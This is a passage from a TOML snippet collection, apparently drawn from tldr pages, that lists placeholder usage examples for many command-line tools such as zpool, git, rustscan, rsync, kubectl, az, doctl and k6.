  command = "docker logs -f <container_name>"
  output = ""

[[snippets]]
  description = "Print stack and locks information of a Java process"
  command = "jhsdb jstack --pid <pid>"
  output = ""

[[snippets]]
  description = "Open a core dump in interactive debug mode"
  command = "jhsdb clhsdb --core <path/to/core_dump> --exe <path/to/jdk/bin/java>"
  output = ""

[[snippets]]
  description = "Start a remote debug server"
  command = "jhsdb debugd --pid <pid> --serverid <optional_unique_id>"
  output = ""

[[snippets]]
  description = "Connect to a process in interactive debug mode"
  command = "jhsdb clhsdb --pid <pid>"
  output = ""

[[snippets]]
  description = "Display general help"
  command = "gh help"
  output = ""

[[snippets]]
  description = "Display help for the `gh help` subcommand"
  command = "gh help --help"
  output = ""

[[snippets]]
  description = "Display help about environment variables that can be used with `gh`"
  command = "gh help environment"
  output = ""

[[snippets]]
  description = "Display a markdown reference of all `gh` commands"
  command = "gh help reference"
  output = ""

[[snippets]]
  description = "Display help about formatting JSON output from `gh` using `jq`"
  command = "gh help formatting"
  output = ""

[[snippets]]
  description = "Display help about using `gh` with MinTTY"
  command = "gh help mintty"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "gh help <subcommand>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand action"
  command = "gh help <pr> <create>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "R"
  output = ""

[[snippets]]
  description = "Start R in vanilla mode (i.e. a blank session that doesn't save the workspace at the end)"
  command = "R --vanilla"
  output = ""

[[snippets]]
  description = "Execute a file"
  command = "R -f <path/to/file.R>"
  output = ""

[[snippets]]
  description = "Execute an R expression and then exit"
  command = "R -e <expr>"
  output = ""

[[snippets]]
  description = "Run R with a debugger"
  command = "R -d <debugger>"
  output = ""

[[snippets]]
  description = "Check R packages from package sources"
  command = "R CMD check <path/to/package_source>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "R --version"
  output = ""

[[snippets]]
  description = "Execute the standard option (traceroute) to a destination"
  command = "scamper -i <192.0.2.1>"
  output = ""

[[snippets]]
  description = "Execute two actions (ping and traceroute) on two different targets"
  command = "scamper -I ""<ping> <192.0.2.1>"" -I ""<trace> <192.0.2.2>"
  output = ""

[[snippets]]
  description = "Ping several hosts with UDP, use a specific port number for the first ping and increase it for each subsequent ping"
  command = "scamper -c ""<ping> -P <UDP-dport> -d <33434>"" -i <192.0.2.1> -i <192.0.2.2>"
  output = ""

[[snippets]]
  description = "Use the Multipath Discovery Algorithm (MDA) to determine the presence of load-balanced paths to the destination and use ICMP echo packets to sample with a maximum of three attempts, write the result to a `warts` file"
  command = "scamper -O <warts> -o <path/to/output.warts> -I ""<tracelb> -P <ICMP-echo> -q <3> <192.0.2.1>"""
  output = ""

[[snippets]]
  description = "Execute a Paris traceroute with ICMP to a destination and save the result in a compressed `warts` file"
  command = "scamper -O <warts.gz> -o <path/to/output.warts> -I ""<trace> -P <icmp-paris> <2001:db8:dead:beaf::4>"""
  output = ""

[[snippets]]
  description = "Record all ICMP packets that arrive at a specific IP address and have a specific ICMP ID in a `warts` file"
  command = "scamper -O <warts> -o <path/to/output.warts> -I ""sniff -S <2001:db8:dead:beef::6> icmp[icmpid] == <101>"""
  output = ""

[[snippets]]
  description = "Show the configuration and status of all ZFS zpools"
  command = "zpool status"
  output = ""

[[snippets]]
  description = "Check a ZFS pool for errors (verifies the checksum of EVERY block). Very CPU and disk intensive"
  command = "zpool scrub <pool_name>"
  output = ""

[[snippets]]
  description = "List zpools available for import"
  command = "zpool import"
  output = ""

[[snippets]]
  description = "Import a zpool"
  command = "zpool import <pool_name>"
  output = ""

[[snippets]]
  description = "Export a zpool (unmount all filesystems)"
  command = "zpool export <pool_name>"
  output = ""

[[snippets]]
  description = "Show the history of all pool operations"
  command = "zpool history <pool_name>"
  output = ""

[[snippets]]
  description = "Create a mirrored pool"
  command = "zpool create <pool_name> mirror <disk1> <disk2> mirror <disk3> <disk4>"
  output = ""

[[snippets]]
  description = "Add a cache (L2ARC) device to a zpool"
  command = "zpool add <pool_name> cache <cache_disk>"
  output = ""

[[snippets]]
  description = "Generate TMS tiles for the zoom levels 2 to 5 of a raster dataset"
  command = "gdal2tiles.py --zoom 2-5 <path/to/input.tif> <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Generate XYZ tiles for the zoom levels 2 to 5 of a raster dataset"
  command = "gdal2tiles.py --zoom 2-5 --xyz <path/to/input.tif> <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "View a summary of all the commits made, grouped alphabetically by author name"
  command = "git shortlog"
  output = ""

[[snippets]]
  description = "View a summary of all the commits made, sorted by the number of commits made"
  command = "git shortlog -n"
  output = ""

[[snippets]]
  description = "View a summary of all the commits made, grouped by the committer identities (name and email)"
  command = "git shortlog -c"
  output = ""

[[snippets]]
  description = "View a summary of the last 5 commits (i.e. specify a revision range)"
  command = "git shortlog HEAD~<5>..HEAD"
  output = ""

[[snippets]]
  description = "View all users, emails and the number of commits in the current branch"
  command = "git shortlog -sne"
  output = ""

[[snippets]]
  description = "View all users, emails and the number of commits in all branches"
  command = "git shortlog -sne --all"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr python"
  output = ""

[[snippets]]
  description = "Scan all ports of one or more comma-delimited [a]ddresses using the default values"
  command = "rustscan --addresses <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Scan the [t]op 1000 ports with service and version detection"
  command = "rustscan --top --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan a specific list of [p]orts"
  command = "rustscan --ports <port1,port2,...,portN> --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan a specific range of ports"
  command = "rustscan --range <start-end> --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Add script arguments to `nmap`"
  command = "rustscan --addresses <address_or_addresses> -- -A -sC"
  output = ""

[[snippets]]
  description = "Scan with custom [b]atch size (default: 4500) and [t]imeout (default: 1500ms)"
  command = "rustscan --batch-size <batch_size> --timeout <timeout> --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan with specific port order"
  command = "rustscan --scan-order <serial|random> --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Scan in greppable mode (only output of the ports, no `nmap`)"
  command = "rustscan --greppable --addresses <address_or_addresses>"
  output = ""

[[snippets]]
  description = "Create a stack from a template file"
  command = "aws cloudformation create-stack --stack-name <stack-name> --region <region> --template-body <file://path/to/file.yml> --profile <profile>"
  output = ""

[[snippets]]
  description = "Delete a stack"
  command = "aws cloudformation delete-stack --stack-name <stack-name> --profile <profile>"
  output = ""

[[snippets]]
  description = "List all stacks"
  command = "aws cloudformation list-stacks --profile <profile>"
  output = ""

[[snippets]]
  description = "List all running stacks"
  command = "aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --profile <profile>"
  output = ""

[[snippets]]
  description = "Check the status of a stack"
  command = "aws cloudformation describe-stacks --stack-name <stack-id> --profile <profile>"
  output = ""

[[snippets]]
  description = "Initiate drift detection for a stack"
  command = "aws cloudformation detect-stack-drift --stack-name <stack-id> --profile <profile>"
  output = ""

[[snippets]]
  description = "Check the drift status output of a stack using 'StackDriftDetectionId' from the previous command output"
  command = "aws cloudformation describe-stack-resource-drifts --stack-name <stack-drift-detection-id> --profile <profile>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr jf"
  output = ""

[[snippets]]
  description = "Check for typos in all text files in the current directory, recursively"
  command = "codespell"
  output = ""

[[snippets]]
  description = "Correct all typos found in-place"
  command = "codespell --write-changes"
  output = ""

[[snippets]]
  description = "Skip files with names that match the specified pattern (accepts a comma-separated list of patterns using wildcards)"
  command = "codespell --skip ""<pattern>"""
  output = ""

[[snippets]]
  description = "Use a custom dictionary file when checking (`--dictionary` can be used multiple times)"
  command = "codespell --dictionary <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Do not check words that are listed in the specified file"
  command = "codespell --ignore-words <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Do not check the specified words"
  command = "codespell --ignore-words-list <ignored_word1,ignored_word2,...>"
  output = ""

[[snippets]]
  description = "Print 3 lines of context around, before or after each match"
  command = "codespell --<context|before-context|after-context> <3>"
  output = ""

[[snippets]]
  description = "Check file names for typos, in addition to file contents"
  command = "codespell --check-filenames"
  output = ""

[[snippets]]
  description = "Switch to a branch"
  command = "dolt checkout <branch_name>"
  output = ""

[[snippets]]
  description = "Revert unstaged changes to a table"
  command = "dolt checkout <table>"
  output = ""

[[snippets]]
  description = "Create new branch and switch to it"
  command = "dolt checkout -b <branch_name>"
  output = ""

[[snippets]]
  description = "Create new branch based on a specified commit and switch to it"
  command = "dolt checkout -b <branch_name> <commit>"
  output = ""

[[snippets]]
  description = "Rebuild with `make` if any file in any subdirectory changes"
  command = "<ag -l> | entr <make>"
  output = ""

[[snippets]]
  description = "Rebuild and test with `make` if any `.c` source files in the current directory change"
  command = "<ls *.c> | entr <'make && make test'>"
  output = ""

[[snippets]]
  description = "Send a `SIGTERM` to any previously spawned ruby subprocesses before executing `ruby main.rb`"
  command = "<ls *.rb> | entr -r <ruby main.rb>"
  output = ""

[[snippets]]
  description = "Run a command with the changed file (`/_`) as an argument"
  command = "<ls *.sql> | entr <psql -f> /_"
  output = ""

[[snippets]]
  description = "Acquire a lease for resource"
  command = "stormlock acquire <resource>"
  output = ""

[[snippets]]
  description = "Release the given lease for the given resource"
  command = "stormlock release <resource> <lease_id>"
  output = ""

[[snippets]]
  description = "Show information on the current lease for a resource, if any"
  command = "stormlock current <resource>"
  output = ""

[[snippets]]
  description = "Test if a lease for given resource is currently active"
  command = "stormlock is-held <resource> <lease_id>"
  output = ""

[[snippets]]
  description = "Move a file from local to a specified bucket"
  command = "aws s3 mv <path/to/local_file> s3://<bucket_name>/<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Move a specific S3 object into another bucket"
  command = "aws s3 mv s3://<bucket_name1>/<path/to/file> s3://<bucket_name2>/<path/to/target>"
  output = ""

[[snippets]]
  description = "Move a specific S3 object into another bucket keeping the original name"
  command = "aws s3 mv s3://<bucket_name1>/<path/to/file> s3://<bucket_name2>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 mv help"
  output = ""

[[snippets]]
  description = "List available bookmarks"
  command = "l"
  output = ""

[[snippets]]
  description = "Save the current directory as "bookmark_name""
  command = "s <bookmark_name>"
  output = ""

[[snippets]]
  description = "Go to a bookmarked directory"
  command = "g <bookmark_name>"
  output = ""

[[snippets]]
  description = "Print a bookmarked directory's contents"
  command = "p <bookmark_name>"
  output = ""

[[snippets]]
  description = "Delete a bookmark"
  command = "d <bookmark_name>"
  output = ""

[[snippets]]
  description = "Change the upstream remote to origin"
  command = "git rename-remote <upstream> <origin>"
  output = ""

[[snippets]]
  description = "Shift the lines in the input image by a randomized amount not exceeding s to the left or to the right"
  command = "ppmshift <s> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Run tests from specific files"
  command = "pytest <path/to/test_file1.py path/to/test_file2.py ...>"
  output = ""

[[snippets]]
  description = "Run tests with names matching a specific [k]eyword expression"
  command = "pytest -k <expression>"
  output = ""

[[snippets]]
  description = "Exit as soon as a test fails or encounters an error"
  command = "pytest --exitfirst"
  output = ""

[[snippets]]
  description = "Run tests matching or excluding markers"
  command = "pytest -m <marker_name1 and not marker_name2>"
  output = ""

[[snippets]]
  description = "Run until a test failure, continuing from the last failing test"
  command = "pytest --stepwise"
  output = ""

[[snippets]]
  description = "Run tests without capturing output"
  command = "pytest --capture=no"
  output = ""

[[snippets]]
  description = "Remove specific directories"
  command = "rmdir <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific nested directories recursively"
  command = "rmdir -p <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Create a resource using the resource definition file"
  command = "kubectl create -f <path/to/file.yml>"
  output = ""

[[snippets]]
  description = "Create a resource from `stdin`"
  command = "kubectl create -f -"
  output = ""

[[snippets]]
  description = "Create a deployment"
  command = "kubectl create deployment <deployment_name> --image=<image>"
  output = ""

[[snippets]]
  description = "Create a deployment with replicas"
  command = "kubectl create deployment <deployment_name> --image=<image> --replicas=<number_of_replicas>"
  output = ""

[[snippets]]
  description = "Create a service"
  command = "kubectl create service <service_type> <service_name> --tcp=<port>:<target_port>"
  output = ""

[[snippets]]
  description = "Create a namespace"
  command = "kubectl create namespace <namespace_name>"
  output = ""

[[snippets]]
  description = "Process input with pictures, saving the output for future typesetting with groff to PostScript"
  command = "pic <path/to/input.pic> > <path/to/output.roff>"
  output = ""

[[snippets]]
  description = "Typeset input with pictures to PDF using the [me] macro package"
  command = "pic -T <pdf> <path/to/input.pic> | groff -<me> -T <pdf> > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Show the current ARP table"
  command = "arp -a"
  output = ""

[[snippets]]
  description = "[d]elete a specific entry"
  command = "arp -d <address>"
  output = ""

[[snippets]]
  description = "[s]et up a new entry in the ARP table"
  command = "arp -s <address> <mac_address>"
  output = ""

[[snippets]]
  description = "Join two files on the first (default) field"
  command = "join <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Join two files using a comma (instead of a space) as the field separator"
  command = "join -t <','> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Join field3 of file1 with field1 of file2"
  command = "join -1 <3> -2 <1> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Produce a line for each unpairable line for file1"
  command = "join -a <1> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Join a file from `stdin`"
  command = "cat <path/to/file1> | join - <path/to/file2>"
  output = ""

[[snippets]]
  description = "Add a border of the specified size to a PNM image"
  command = "pnmmargin <size> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the color of the border"
  command = "pnmmargin -color <color> <size> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Convert a Shapefile into a GeoPackage"
  command = "ogr2ogr -f GPKG <path/to/output.gpkg> <path/to/input.shp>"
  output = ""

[[snippets]]
  description = "Reduce a GeoJSON to features matching a condition"
  command = "ogr2ogr -where '<myProperty > 42>' -f <GeoJSON> <path/to/output.geojson> <path/to/input.geojson>"
  output = ""

[[snippets]]
  description = "Change coordinate reference system of a GeoPackage from `EPSG:4326` to `EPSG:3857`"
  command = "ogr2ogr -s_srs <EPSG:4326> -t_srs <EPSG:3857> -f GPKG <path/to/output.gpkg> <path/to/input.gpkg>"
  output = ""

[[snippets]]
  description = "Convert a CSV file into a GeoPackage, specifying the names of the coordinate columns and assigning a coordinate reference system"
  command = "ogr2ogr -f GPKG <path/to/output.gpkg> <path/to/input.csv> -oo X_POSSIBLE_NAMES=<longitude> -oo Y_POSSIBLE_NAMES=<latitude> -a_srs <EPSG:4326>"
  output = ""

[[snippets]]
  description = "Load a GeoPackage into a PostGIS database"
  command = "ogr2ogr -f PostgreSQL PG:dbname=""<database_name>"" <path/to/input.gpkg>"
  output = ""

[[snippets]]
  description = "Clip layers of a GeoPackage file to the given bounding box"
  command = "ogr2ogr -spat <min_x> <min_y> <max_x> <max_y> -f GPKG <path/to/output.gpkg> <path/to/input.gpkg>"
  output = ""

[[snippets]]
  description = "Start Picard"
  command = "picard"
  output = ""

[[snippets]]
  description = "Open a set of files"
  command = "picard <path/to/file1.mp3> <path/to/file2.mp3>"
  output = ""

[[snippets]]
  description = "Display the version of Picard installed"
  command = "picard --long-version"
  output = ""

[[snippets]]
  description = "Register a runner"
  command = "sudo gitlab-runner register --url <https://gitlab.example.com> --registration-token <token> --name <name>"
  output = ""

[[snippets]]
  description = "Register a runner with a Docker executor"
  command = "sudo gitlab-runner register --url <https://gitlab.example.com> --registration-token <token> --name <name> --executor <docker>"
  output = ""

[[snippets]]
  description = "Unregister a runner"
  command = "sudo gitlab-runner unregister --name <name>"
  output = ""

[[snippets]]
  description = "Display the status of the runner service"
  command = "sudo gitlab-runner status"
  output = ""

[[snippets]]
  description = "Restart the runner service"
  command = "sudo gitlab-runner restart"
  output = ""

[[snippets]]
  description = "Check if the registered runners can connect to GitLab"
  command = "sudo gitlab-runner verify"
  output = ""

[[snippets]]
  description = "List all available and configured networks on docker daemon"
  command = "docker network ls"
  output = ""

[[snippets]]
  description = "Create a user-defined network"
  command = "docker network create --driver <driver_name> <network_name>"
  output = ""

[[snippets]]
  description = "Display detailed information about one or more networks"
  command = "docker network inspect <network_name1 network_name2 ...>"
  output = ""

[[snippets]]
  description = "Connect a container to a network using a name or ID"
  command = "docker network connect <network_name> <container_name|ID>"
  output = ""

[[snippets]]
  description = "Disconnect a container from a network"
  command = "docker network disconnect <network_name> <container_name|ID>"
  output = ""

[[snippets]]
  description = "Remove all unused (not referenced by any container) networks"
  command = "docker network prune"
  output = ""

[[snippets]]
  description = "Remove one or more unused networks"
  command = "docker network rm <network_name1 network_name2 ...>"
  output = ""

[[snippets]]
  description = "Launch OBS"
  command = "obs"
  output = ""

[[snippets]]
  description = "Launch OBS in portable mode"
  command = "obs --portable"
  output = ""

[[snippets]]
  description = "Automatically start recording a video on launch"
  command = "obs --startrecording"
  output = ""

[[snippets]]
  description = "Automatically start the replay buffer on launch"
  command = "obs --startreplaybuffer"
  output = ""

[[snippets]]
  description = "Automatically start streaming on launch"
  command = "obs --startstreaming"
  output = ""

[[snippets]]
  description = "Minimise to the system tray on launch"
  command = "obs --minimize-to-tray"
  output = ""

[[snippets]]
  description = "Make the log more verbose (for debugging)"
  command = "obs --verbose"
  output = ""

[[snippets]]
  description = "Transfer a file"
  command = "rsync <path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Use archive mode (recursively copy directories, copy symlinks without resolving, and preserve permissions, ownership and modification times)"
  command = "rsync --archive <path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Compress the data as it is sent to the destination, display verbose and human-readable progress, and keep partially transferred files if interrupted"
  command = "rsync --compress --verbose --human-readable --partial --progress <path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Recursively copy directories"
  command = "rsync --recursive <path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Transfer directory contents, but not the directory itself"
  command = "rsync --recursive <path/to/source>/ <path/to/destination>"
  output = ""

[[snippets]]
  description = "Use archive mode, resolve symlinks and skip files that are newer on the destination"
  command = "rsync --archive --update --copy-links <path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Transfer a directory to a remote host running `rsyncd` and delete files on the destination that do not exist on the source"
  command = "rsync --recursive --delete rsync://<host>:<path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Transfer a file over SSH using a different port than the default (22) and show global progress"
  command = "rsync --rsh 'ssh -p <port>' --info=progress2 <host>:<path/to/source> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Merge the pull request associated with the current branch interactively"
  command = "gh pr merge"
  output = ""

[[snippets]]
  description = "Merge the specified pull request, interactively"
  command = "gh pr merge <pr_number>"
  output = ""

[[snippets]]
  description = "Merge the pull request, removing the branch on both the local and the remote"
  command = "gh pr merge --delete-branch"
  output = ""

[[snippets]]
  description = "Merge the current pull request with the specified merge strategy"
  command = "gh pr merge --<merge|squash|rebase>"
  output = ""

[[snippets]]
  description = "Merge the current pull request with the specified merge strategy and commit message"
  command = "gh pr merge --<merge|squash|rebase> --subject <commit_message>"
  output = ""

[[snippets]]
  description = "Squash the current pull request into one commit with the message body and merge"
  command = "gh pr merge --squash --body=""<commit_message_body>"""
  output = ""

[[snippets]]
  description = "Display help"
  command = "gh pr merge --help"
  output = ""

[[snippets]]
  description = "Print directories only"
  command = "tre --directories"
  output = ""

[[snippets]]
  description = "Print JSON containing files in the tree hierarchy instead of the normal tree diagram"
  command = "tre --json"
  output = ""

[[snippets]]
  description = "Print files and directories up to the specified depth limit (where 1 means the current directory)"
  command = "tre --limit <depth>"
  output = ""

[[snippets]]
  description = "Print all hidden files and directories using the specified colorization mode"
  command = "tre --all --color <automatic|always|never>"
  output = ""

[[snippets]]
  description = "Print files within the tree hierarchy, assigning a shell alias to each file that, when called, will open the associated file using the provided `command` (or in `$EDITOR` by default)"
  command = "tre --editor <command>"
  output = ""

[[snippets]]
  description = "Print files within the tree hierarchy, excluding all paths that match the provided regular expression"
  command = "tre --exclude <regular_expression>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "tre --version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "tre --help"
  output = ""

[[snippets]]
  description = "[o]utput a blockmap file from image file"
  command = "bmaptool create -o <blockmap.bmap> <source.img>"
  output = ""

[[snippets]]
  description = "Copy an image file into sdb"
  command = "bmaptool copy --bmap <blockmap.bmap> <source.img> </dev/sdb>"
  output = ""

[[snippets]]
  description = "Copy a compressed image file into sdb"
  command = "bmaptool copy --bmap <blockmap.bmap> <source.img.gz> </dev/sdb>"
  output = ""

[[snippets]]
  description = "Copy an image file into sdb without using a blockmap"
  command = "bmaptool copy --nobmap <source.img> </dev/sdb>"
  output = ""

[[snippets]]
  description = "Look up the canonical name associated with an email address"
  command = "git check-mailmap ""<<email@example.com>>"""
  output = ""

[[snippets]]
  description = "Get balance of the account associated with the current context"
  command = "doctl balance get"
  output = ""

[[snippets]]
  description = "Get the balance of an account associated with an access token"
  command = "doctl balance get --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Get the balance of an account associated with a specified context"
  command = "doctl balance get --context"
  output = ""

[[snippets]]
  description = "Protect branches of a GitHub repository (create branch protection rules)"
  command = "protector <branches_regex> -repos <organization/repository>"
  output = ""

[[snippets]]
  description = "Use the dry run to see what would be protected (can also be used for freeing)"
  command = "protector -dry-run <branches_regex> -repos <organization/repository>"
  output = ""

[[snippets]]
  description = "Free branches of a GitHub repository (delete branch protection rules)"
  command = "protector -free <branches_regex> -repos <organization/repository>"
  output = ""

[[snippets]]
  description = "Create a queue"
  command = "az storage queue create --account-name <storage_account_name> --name <queue_name> --metadata <queue_metadata>"
  output = ""

[[snippets]]
  description = "Generate a shared access signature for the queue"
  command = "az storage queue generate-sas --account-name <storage_account_name> --name <queue_name> --permissions <queue_permissions> --expiry <expiry_date> --https-only"
  output = ""

[[snippets]]
  description = "List queues in a storage account"
  command = "az storage queue list --prefix <filter_prefix> --account-name <storage_account_name>"
  output = ""

[[snippets]]
  description = "Delete the specified queue and any messages it contains"
  command = "az storage queue delete --account-name <storage_account_name> --name <queue_name> --fail-not-exist"
  output = ""

[[snippets]]
  description = "Print the hexadecimal representation of a file, replacing duplicate lines by '*'"
  command = "hexdump <path/to/file>"
  output = ""

[[snippets]]
  description = "Display the input offset in hexadecimal and its ASCII representation in two columns"
  command = "hexdump -C <path/to/file>"
  output = ""

[[snippets]]
  description = "Display the hexadecimal representation of a file, but interpret only n bytes of the input"
  command = "hexdump -C -n<number_of_bytes> <path/to/file>"
  output = ""

[[snippets]]
  description = "Don't replace duplicate lines with '*'"
  command = "hexdump --no-squeezing <path/to/file>"
  output = ""

[[snippets]]
  description = "Add a file from local to the filesystem, pin it and print the relative hash"
  command = "ipfs add <path/to/file>"
  output = ""

[[snippets]]
  description = "Add a directory and its files recursively from local to the filesystem and print the relative hash"
  command = "ipfs add -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Save a remote file and give it a name but not pin it"
  command = "ipfs get <hash> -o <path/to/file>"
  output = ""

[[snippets]]
  description = "Pin a remote file locally"
  command = "ipfs pin add <hash>"
  output = ""

[[snippets]]
  description = "Display pinned files"
  command = "ipfs pin ls"
  output = ""

[[snippets]]
  description = "Unpin a file from the local storage"
  command = "ipfs pin rm <hash>"
  output = ""

[[snippets]]
  description = "Remove unpinned files from local storage"
  command = "ipfs repo gc"
  output = ""

[[snippets]]
  description = "Create specific files"
  command = "touch <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Set the file [a]ccess or [m]odification times to the current one and don't [c]reate file if it doesn't exist"
  command = "touch -c -<a|m> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Set the file [t]ime to a specific value and don't [c]reate file if it doesn't exist"
  command = "touch -c -t <YYYYMMDDHHMM.SS> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Set the file time of a specific file to the time of anothe[r] file and don't [c]reate file if it doesn't exist"
  command = "touch -c -r <~/.emacs> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Build the first project file in the current directory"
  command = "msbuild"
  output = ""

[[snippets]]
  description = "Build a specific project file"
  command = "msbuild <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Specify one or more semicolon-separated targets to build"
  command = "msbuild <path/to/project_file> /target:<targets>"
  output = ""

[[snippets]]
  description = "Specify one or more semicolon-separated properties"
  command = "msbuild <path/to/project_file> /property:<name=value>"
  output = ""

[[snippets]]
  description = "Specify the build tools version to use"
  command = "msbuild <path/to/project_file> /toolsversion:<version>"
  output = ""

[[snippets]]
  description = "Display detailed information at the end of the log about how the project was configured"
  command = "msbuild <path/to/project_file> /detailedsummary"
  output = ""

[[snippets]]
  description = "Display help"
  command = "msbuild /help"
  output = ""

[[snippets]]
  description = "Run load test locally"
  command = "k6 run <script.js>"
  output = ""

[[snippets]]
  description = "Run load test locally with a given number of virtual users and duration"
  command = "k6 run --vus <10> --duration <30s> <script.js>"
  output = ""

[[snippets]]
  description = "Run load test locally with a given environment variable"
  command = "k6 run -e <HOSTNAME=example.com> <script.js>"
  output = ""

[[snippets]]
  description = "Run load test locally using InfluxDB to store results"
  command = "k6 run --out influxdb=<http://localhost:8086/k6db> <script.js>"
  output = ""

[[snippets]]
  description = "Run load test locally and discard response bodies (significantly faster)"
  command = "k6 run --discard-response-bodies <script.js>"
  output = ""

[[snippets]]
  description = "Run load test locally using the base JavaScript compatibility mode (significantly faster)"
  command = "k6 run --compatibility-mode=base <script.js>"
  output = ""

[[snippets]]
  description = "Log in to cloud service using secret token"
  command = "k6 login cloud --token <secret>"
  output = ""

[[snippets]]
  description = "Run load test on cloud infrastructure"
  command = "k6 cloud <script.js>"
  output = ""

[[snippets]]
  description = "Create an storage account"
  command = "az storage account create --name <storage_account_name> --resource-group <azure_resource_group> --location <azure_location> --sku <storage_account_sku>"
  output = ""

[[snippets]]
  description = "Generate a shared access signature for a specific storage account"
  command = "az storage account generate-sas --account-name <storage_account_name> --name <account_name> --permissions <sas_permissions> --expiry <expiry_date> --services <storage_services> --resource-types <resource_types>"
  output = ""

[[snippets]]
  description = "List storage accounts"
  command = "az storage account list --resource-group <azure_resource_group>"
  output = ""

[[snippets]]
  description = "Delete a specific storage account"
  command = "az storage account delete --name <storage_account_name> --resource-group <azure_resource_group>"
  output = ""

[[snippets]]
  description = "List all local locked files"
  command = "git locked"
  output = ""

[[snippets]]
  description = "Run in a project's directory"
  command = "cppclean <path/to/project>"
  output = ""

[[snippets]]
  description = "Run on a project where the headers are in the `inc1/` and `inc2/` directories"
  command = "cppclean <path/to/project> --include-path=<inc1> --include-path=<inc2>"
  output = ""

[[snippets]]
  description = "Run on a specific file `main.cpp`"
  command = "cppclean <main.cpp>"
  output = ""

[[snippets]]
  description = "Run on the current directory, excluding the "build" directory"
  command = "cppclean <.> --exclude=<build>"
  output = ""

[[snippets]]
  description = "Add simulated shadows to a PPM image"
  command = "ppmshadow <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "[b]lur the image by the specified number of pixels"
  command = "ppmshadow -b <n> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Specify the displacement of the simulated light source to the left and the top of the image"
  command = "ppmshadow -x <left_offset> -y <top_offset> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Create a Kubernetes cluster"
  command = "doctl kubernetes cluster create --count <3> --region <nyc1> --size <s-1vcpu-2gb> --version <latest> <cluster_name>"
  output = ""

[[snippets]]
  description = "List all Kubernetes clusters"
  command = "doctl kubernetes cluster list"
  output = ""

[[snippets]]
  description = "Fetch and save the kubeconfig"
  command = "doctl kubernetes cluster kubeconfig save <cluster_name>"
  output = ""

[[snippets]]
  description = "Check for available upgrades"
  command = "doctl kubernetes cluster get-upgrades <cluster_name>"
  output = ""

[[snippets]]
  description = "Upgrade a cluster to a new Kubernetes version"
  command = "doctl kubernetes cluster upgrade <cluster_name>"
  output = ""

[[snippets]]
  description = "Delete a cluster"
  command = "doctl kubernetes cluster delete <cluster_name>"
  output = ""

[[snippets]]
  description = "Start `hangups`"
  command = "hangups"
  output = ""

[[snippets]]
  description = "Display troubleshooting information and help"
  command = "hangups -h"
  output = ""

[[snippets]]
  description = "Set a refresh token for hangups"
  command = "hangups --token-path <path/to/token>"
  output = ""

[[snippets]]
  description = "Specify the storage directory (default: `/data/db` on Linux and macOS, `C:\data\db` on Windows)"
  command = "mongod --dbpath <path/to/directory>"
  output = ""

[[snippets]]
  description = "Specify a configuration file"
  command = "mongod --config <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify the port to listen on (default: 27017)"
  command = "mongod --port <port>"
  output = ""

[[snippets]]
  description = "Specify the database profiling level. 0 is off, 1 is only slow operations, 2 is all (default: 0)"
  command = "mongod --profile <0|1|2>"
  output = ""

[[snippets]]
  description = "Compile and print all firewall rules"
  command = "pve-firewall compile"
  output = ""

[[snippets]]
  description = "Show information about the local network"
  command = "pve-firewall localnet"
  output = ""

[[snippets]]
  description = "Restart the Proxmox VE Firewall service"
  command = "pve-firewall restart"
  output = ""

[[snippets]]
  description = "Start the Proxmox VE Firewall service"
  command = "pve-firewall start"
  output = ""

[[snippets]]
  description = "Stop the Proxmox VE Firewall service"
  command = "pve-firewall stop"
  output = ""

[[snippets]]
